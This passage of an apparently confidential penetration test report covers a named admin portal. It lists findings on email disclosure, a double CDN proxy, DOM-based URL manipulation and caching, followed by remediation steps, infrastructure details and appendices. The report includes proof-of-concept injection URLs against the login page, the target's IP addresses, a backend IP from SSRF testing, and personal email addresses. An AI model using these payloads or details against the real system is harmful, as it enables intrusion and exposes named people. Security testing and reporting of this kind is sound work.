            "email":"dev.user@3point3labs.com",
            ...
        }
    ]
}</div>

            <h3>Impact</h3>
            <ul>
                <li><strong>Social Engineering:</strong> Email addresses can be used for targeted phishing campaigns</li>
                <li><strong>Information Leakage:</strong> Reveals development team structure and vendor relationships (3point3labs.com)</li>
                <li><strong>Account Enumeration:</strong> Attacker knows valid email addresses for authentication attempts</li>
                <li><strong>OSINT:</strong> Facilitates open-source intelligence gathering</li>
            </ul>

            <h3>Remediation Recommendations</h3>
            <ol>
                <li>Implement field-level access control - only return email for current user</li>
                <li>Mask or obfuscate email addresses (e.g., a***t@3point3labs.com)</li>
                <li>Use non-personal contact emails (e.g., support@cbredigiverse.com)</li>
                <li>Remove unnecessary user data from list responses</li>
                <li>Implement role-based filtering of sensitive fields</li>
            </ol>
        </div>

        <div class="page-break"></div>

        <!-- Finding 5: Redundant Proxy -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">5. Redundant Proxy Infrastructure Breaking Security Controls</div>
                <div><span class="severity-info">Informational</span></div>
            </div>

            <h3>Description</h3>
            <p>The application is configured with redundant proxy layers - traffic flows through Cloudflare's CDN proxy before reaching Vercel's Edge Network. This configuration breaks Vercel's shared responsibility security model and significantly impairs security visibility.</p>

            <h3>Evidence</h3>
            <div class="code-block">$ curl -I -L admintest.cbredigiverse.com

# Response headers show double proxy:
HTTP/1.1 301 Moved Permanently
Server: cloudflare
CF-RAY: 98e10181afd33969-LAX

HTTP/2 307
server: cloudflare
x-vercel-id: sfo1::c4nl9-1760381251848-5af816827cf1

HTTP/2 200
server: cloudflare
x-vercel-cache: HIT
x-vercel-id: sfo1::sd57p-1760381253292-ca8adcd144f1
cf-cache-status: DYNAMIC
cf-ray: 98e101910aad2b4e-LAX</div>

            <p>Both <span class="code-inline">Server: cloudflare</span> and <span class="code-inline">x-vercel-id</span> headers confirm the double-proxy architecture.</p>

            <h3>Technical Details</h3>
            
            <p><strong>Request Flow:</strong></p>
            <div class="code-block">Client → Cloudflare Proxy → Vercel Edge → Application
         (CF-RAY trace)       (x-vercel-id)</div>

            <p><strong>Header Analysis:</strong></p>
            <ul>
                <li><span class="code-inline">cf-cache-status: DYNAMIC</span> - Cloudflare is actively proxying</li>
                <li><span class="code-inline">x-vercel-cache: HIT</span> - Vercel is also caching</li>
                <li><span class="code-inline">age: 973224</span> - Shows Vercel's cache age, but Cloudflare controls what reaches it</li>
            </ul>

            <h3>Security Impact</h3>

            <div class="danger-box">
                <h4>1. Broken IP-Based Security Controls</h4>
                <ul>
                    <li>Vercel sees all traffic originating from Cloudflare IPs (not actual clients)</li>
                    <li>Rate limiting becomes ineffective (all requests appear to come from same source)</li>
                    <li>Geolocation-based restrictions fail</li>
                    <li>IP reputation checks are bypassed</li>
                </ul>
            </div>

            <div class="warning-box">
                <h4>2. Impaired Security Monitoring</h4>
                <ul>
                    <li>Vercel WAF (if enabled) receives sanitized/proxied traffic, reducing threat detection accuracy</li>
                    <li>Vercel Bot Management cannot analyze true client fingerprints</li>
                    <li>Vercel Analytics shows Cloudflare IPs instead of actual visitor sources</li>
                    <li>Security logs don't reflect true attack origins</li>
                </ul>
            </div>

            <div class="warning-box">
                <h4>3. Obscured Attack Attribution</h4>
                <ul>
                    <li>During a security incident, forensic analysis is complicated</li>
                    <li>True attacker IPs are hidden behind Cloudflare</li>
                    <li>Difficult to implement emergency IP blocks at Vercel level</li>
                </ul>
            </div>

            <div class="warning-box">
                <h4>4. Conflicting Security Policies</h4>
                <ul>
                    <li>Two separate caching layers with potentially conflicting rules</li>
                    <li>Security headers may be modified inconsistently</li>
                    <li>SSL/TLS termination happens twice, complicating certificate management</li>
                </ul>
            </div>

            <h3>Why This Happens</h3>
            <p>This configuration is often unintentional and occurs when:</p>
            <ol>
                <li>Domain DNS is set to "Proxied" (orange cloud) in Cloudflare</li>
                <li>Application is simultaneously deployed on Vercel</li>
                <li>Vercel's own edge network is already providing CDN/security features</li>
            </ol>

            <h3>Remediation Recommendations</h3>
            
            <p><strong>Priority:</strong> Medium (Should be addressed in next infrastructure review)</p>

            <h4>Recommended Action: Remove Cloudflare Proxy Layer</h4>

            <p><strong>1. In Cloudflare Dashboard:</strong></p>
            <ul>
                <li>Go to DNS settings for cbredigiverse.com</li>
                <li>Find the record for admintest.cbredigiverse.com</li>
                <li>Click the orange cloud icon to change it to "DNS Only" (gray cloud)</li>
                <li>This allows DNS resolution without proxying traffic</li>
            </ul>

            <p><strong>2. Rely on Vercel's Edge Network for:</strong></p>
            <ul>
                <li>DDoS protection (Vercel provides this natively)</li>
                <li>Global CDN (Vercel has edge nodes worldwide)</li>
                <li>SSL/TLS termination (Vercel handles this automatically)</li>
                <li>WAF capabilities (if using Vercel's security products)</li>
            </ul>

            <h4>Alternative: Keep Cloudflare but Configure Properly</h4>
            <p>If Cloudflare proxy must remain:</p>
            <ul>
                <li>Enable <strong>"True-Client-IP"</strong> header (Cloudflare Enterprise)</li>
                <li>Configure Vercel to trust Cloudflare's forwarded headers</li>
                <li>Ensure consistent security policies across both layers</li>
                <li>Monitor both Cloudflare and Vercel logs for correlation</li>
            </ul>

            <div class="success-box">
                <h4>Benefits of Removing Cloudflare Proxy:</h4>
                <p><strong>✅ Security:</strong></p>
                <ul>
                    <li>Vercel WAF sees actual client IPs and behaviors</li>
                    <li>Accurate rate limiting and bot detection</li>
                    <li>Simplified security monitoring and incident response</li>
                    <li>Single point of security policy enforcement</li>
                </ul>
                <p><strong>✅ Performance:</strong></p>
                <ul>
                    <li>Reduced latency (one fewer hop)</li>
                    <li>Simplified cache management</li>
                    <li>No conflicting cache rules</li>
                </ul>
                <p><strong>✅ Operational:</strong></p>
                <ul>
                    <li>Easier troubleshooting</li>
                    <li>Clearer security logs</li>
                    <li>Reduced infrastructure complexity</li>
                </ul>
            </div>

            <h3>Notes</h3>
            <ul>
                <li>Vercel already provides: Global CDN, DDoS protection, automatic SSL, edge functions</li>
                <li>Cloudflare can still provide: DNS management, DNS-level security (when not proxied)</li>
                <li>This is a common misconfiguration when migrating from traditional hosting to modern PaaS platforms</li>
            </ul>
        </div>

        <div class="page-break"></div>

        <!-- Finding 6: DOM Manipulation -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">6. DOM-Based Data Manipulation</div>
                <div><span class="severity-info">Informational</span></div>
            </div>

            <p><strong>CVSS Vector:</strong> <span class="code-inline">CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N</span> (3.1 - Low)</p>

            <h3>Description</h3>
            <p>The login page is vulnerable to DOM-based data manipulation where controllable data from location.hash, location.search, and location.pathname is passed to history.replaceState without proper sanitization.</p>

            <h3>Affected Endpoint</h3>
            <ul>
                <li>/public/login</li>
            </ul>

            <h3>Technical Details</h3>
            <p><strong>Sources (Untrusted Input):</strong></p>
            <ol>
                <li>location.hash - URL fragment identifier</li>
                <li>location.search - URL query parameters</li>
                <li>location.pathname - URL path</li>
            </ol>

            <p><strong>Sink (Dangerous Operation):</strong></p>
            <ul>
                <li>history.replaceState - Modifies browser history</li>
            </ul>

            <p><strong>Proof of Concept Payloads:</strong></p>
            <div class="code-block"># Fragment injection
https://admintest.cbredigiverse.com/public/login#test=test'"&lt;/test&gt;

# Query injection
https://admintest.cbredigiverse.com/public/login?param=value'"&lt;/param&gt;

# Path injection
https://admintest.cbredigiverse.com/public/login//test'"&lt;/test&gt;</div>

            <h3>Impact (Limited)</h3>
            <ul>
                <li><strong>UI Manipulation:</strong> Potential for misleading users through URL manipulation</li>
                <li><strong>Analytics Poisoning:</strong> Could affect client-side analytics tracking</li>
                <li><strong>Session History Manipulation:</strong> Browser history could be manipulated</li>
                <li><strong>Low Severity:</strong> No direct security impact without additional vulnerabilities (XSS)</li>
            </ul>

            <h3>Remediation Recommendations</h3>
            <ol>
                <li>Sanitize all URL components before using in history.replaceState</li>
                <li>Implement strict input validation on URL parameters</li>
                <li>Use URL parsing libraries to properly encode special characters</li>
                <li>Consider if history manipulation is necessary functionality</li>
            </ol>
        </div>

        <!-- Finding 7: Cacheable Sensitive Data -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">7. Cacheable HTTPS Response with Sensitive Data</div>
                <div><span class="severity-info">Informational</span></div>
            </div>

            <h3>Description</h3>
            <p>The /authorized/users endpoint returns sensitive user data with caching headers that allow browser storage.</p>

            <h3>Technical Details</h3>
            <div class="code-block">HTTP/2 200 OK
Cache-Control: public, max-age=0, must-revalidate</div>

            <p>While <span class="code-inline">max-age=0</span> requires revalidation, the <span class="code-inline">public</span> directive allows caching in shared caches.</p>

            <h3>Impact</h3>
            <ul>
                <li>Sensitive user data may be stored in browser cache</li>
                <li>Accessible to other users on shared computers</li>
                <li>Potential for data leakage</li>
            </ul>

            <h3>Remediation</h3>
            <div class="code-block">Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache</div>
        </div>

        <!-- Finding 8: Missing Security Headers -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">8. Missing Security Headers</div>
                <div><span class="severity-info">Informational</span></div>
            </div>

            <h3>Identified Issues</h3>
            <ol>
                <li><strong>Missing X-Content-Type-Options:</strong> Some endpoints lack <span class="code-inline">X-Content-Type-Options: nosniff</span> header, though most include it.</li>
                <li><strong>Inconsistent Header Implementation:</strong> While critical endpoints include proper security headers, some static resources and redirects lack them.</li>
            </ol>

            <h3>Recommended Headers</h3>
            <div class="code-block">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()</div>
        </div>

        <div class="page-break"></div>

        <!-- Infrastructure Analysis -->
        <h1>Infrastructure Analysis</h1>

        <h2>Technology Stack</h2>
        <ul>
            <li><strong>Frontend:</strong> React with Next.js 14.2.5</li>
            <li><strong>Build Tools:</strong> Webpack</li>
            <li><strong>Styling:</strong> Tailwind CSS</li>
            <li><strong>JavaScript Libraries:</strong> Lodash 4.17.21</li>
            <li><strong>Hosting:</strong> Vercel (PaaS)</li>
            <li><strong>CDN:</strong> Cloudflare (currently proxying traffic)</li>
            <li><strong>Security:</strong> HSTS enabled, HTTP/3 support</li>
        </ul>

        <h2>DNS Information</h2>
        <div class="code-block">admintest.cbredigiverse.com → 172.67.216.69, 104.21.16.225 (Cloudflare)

Backend Infrastructure: Hosted on Vercel (source IP: 35.156.67.171 observed in SSRF testing)</div>

        <h2>Certificate Information</h2>
        <table>
            <tbody>
                <tr>
                    <td><strong>Issuer:</strong></td>
                    <td>Google Trust Services (WE1)</td>
                </tr>
                <tr>
                    <td><strong>Subject:</strong></td>
                    <td>cbredigiverse.com, *.cbredigiverse.com</td>
                </tr>
                <tr>
                    <td><strong>Valid:</strong></td>
                    <td>August 17, 2025 - November 15, 2025</td>
                </tr>
                <tr>
                    <td><strong>Chain:</strong></td>
                    <td>WE1 → GTS Root R4 → GlobalSign Root CA</td>
                </tr>
            </tbody>
        </table>

        <div class="page-break"></div>

        <!-- Recommendations Summary -->
        <h1>Recommendations Summary</h1>

        <h2>High Priority</h2>
        <div class="danger-box">
            <p><strong>None</strong> - No high-severity vulnerabilities identified</p>
        </div>

        <h2>Medium Priority</h2>
        <div class="warning-box">
            <ol>
                <li><strong>Remediate constrained SSRF</strong> - Implement URL whitelist to prevent even limited SSRF exploitation</li>
                <li><strong>Address redundant proxy configuration</strong> - Remove Cloudflare proxy or configure proper header forwarding</li>
                <li><strong>Implement proper cache headers</strong> for sensitive endpoints</li>
                <li><strong>Remove email disclosure</strong> from API responses</li>
            </ol>
        </div>

        <h2>Low Priority</h2>
        <div class="info-box">
            <ol start="5">
                <li><strong>Add Vary: Origin header</strong> to CORS responses (prevents cache issues)</li>
                <li><strong>Fix DOM manipulation vulnerabilities</strong></li>
                <li><strong>Conduct comprehensive API security testing</strong> (separate engagement)</li>
                <li><strong>Implement rate limiting</strong> across all endpoints</li>
                <li><strong>Security header standardization</strong></li>
            </ol>
        </div>

        <h2>Security Best Practices</h2>
        <div class="info-box">
            <ol start="10">
                <li>Regular security scanning in CI/CD pipeline</li>
                <li>Security awareness training for developers</li>
                <li>Implement comprehensive logging and monitoring for suspicious activity</li>
                <li>Conduct regular penetration testing (quarterly recommended)</li>
            </ol>
        </div>

        <div class="page-break"></div>

        <!-- Conclusion -->
        <h1>Conclusion</h1>

        <p>The CBRE Digiverse Admin Portal demonstrates a <strong>strong security foundation</strong> with proper CORS implementation and secure authentication mechanisms.</p>

        <h2>Key Positive Findings:</h2>
        <div class="success-box">
            <ul>
                <li><span class="checkmark">✅</span> CORS policy correctly uses an explicit whitelist and rejects unauthorized origins</li>
                <li><span class="checkmark">✅</span> No critical or high-severity vulnerabilities identified</li>
                <li><span class="checkmark">✅</span> Authentication mechanisms properly implemented</li>
                <li><span class="checkmark">✅</span> Static assets properly configured with industry-standard CORS</li>
            </ul>
        </div>

        <h2>Primary Concerns:</h2>
        <div class="warning-box">
            <ol>
                <li><strong>Constrained SSRF (Medium Risk)</strong> - Limited but present attack vector requiring remediation</li>
                <li><strong>Redundant Proxy Infrastructure (Architectural Issue)</strong> - Breaks security controls and visibility</li>
                <li><strong>Missing Vary: Origin Header (Low Risk)</strong> - May cause cache inconsistencies but not a security issue</li>
            </ol>
        </div>

        <h2>Overall Risk Rating: MEDIUM</h2>
        <p>The application's security posture is solid, with the constrained SSRF vulnerability being the primary concern requiring immediate attention. The CORS implementation, initially flagged as high-severity, was confirmed to be <strong>secure and properly configured</strong> with an explicit whitelist.</p>

        <h2>Priority Actions:</h2>
        <table>
            <thead>
                <tr>
                    <th>Priority</th>
                    <th>Action</th>
                    <th>Timeline</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="severity-medium">Immediate</span></td>
                    <td>Implement URL whitelisting for SSRF endpoints</td>
                    <td>Within 1 week</td>
                </tr>
                <tr>
                    <td><span class="severity-medium">Short-term</span></td>
                    <td>Address redundant proxy configuration and implement proper header forwarding or remove Cloudflare proxy</td>
                    <td>Within 1 month</td>
                </tr>
                <tr>
                    <td><span class="severity-low">Medium-term</span></td>
                    <td>Add Vary: Origin header and address remaining informational findings</td>
                    <td>Within 3 months</td>
                </tr>
            </tbody>
        </table>

        <p style="margin-top: 30px;">With proper remediation of the identified vulnerabilities, particularly the SSRF vulnerability, the security posture of the application will be significantly improved.</p>

        <div class="page-break"></div>

        <!-- Appendices -->
        <h1>Appendices</h1>

        <h2>A. Testing Tools Used</h2>
        <ul>
            <li>Burp Suite Professional 2025.8.2</li>
            <li>Nikto 2.5.0</li>
            <li>curl 8.14.1</li>
            <li>Wappalyzer</li>
            <li>Burp Collaborator (OAST)</li>
            <li>dig (DNS queries)</li>
        </ul>

        <h2>B. Credentials Used</h2>
        <ul>
            <li>Authenticated testing performed with provided admin credentials</li>
            <li>Role: COUNTRY_ADMIN</li>
            <li>Test user: super@ictak.info</li>
        </ul>

        <h2>C. Testing Timeline</h2>
        <table>
            <thead>
                <tr>
                    <th>Date</th>
                    <th>Activity</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>October 11, 2025</td>
                    <td>Initial reconnaissance and automated scanning</td>
                </tr>
                <tr>
                    <td>October 12, 2025</td>
                    <td>Manual vulnerability testing, SSRF constraint analysis, and exploitation attempts</td>
                </tr>
                <tr>
                    <td>October 13, 2025</td>
                    <td>Infrastructure analysis and report compilation</td>
                </tr>
            </tbody>
        </table>

        <h2>D. Contact Information</h2>
        <div class="info-box">
            <p><strong>Prepared By:</strong> Hareesh Rajendran<br>
            <strong>Role:</strong> Independent Penetration Tester<br>
            <strong>Location:</strong> Trivandrum, Kerala, India<br>
            <strong>LinkedIn:</strong> linkedin.com/in/hareesh-rajendran<br>
            <strong>Report Date:</strong> October 13, 2025</p>
        </div>

        <div class="footer">
            <p><strong>Classification:</strong> Confidential - Internal Use Only</p>
            <p style="margin-top: 10px; font-style: italic;">This report contains sensitive security information and should be handled according to your organization's data classification policies.</p>
            <p style="margin-top: 20px;"><strong>END OF REPORT</strong></p>
        </div>
    </div>
</body>
</html>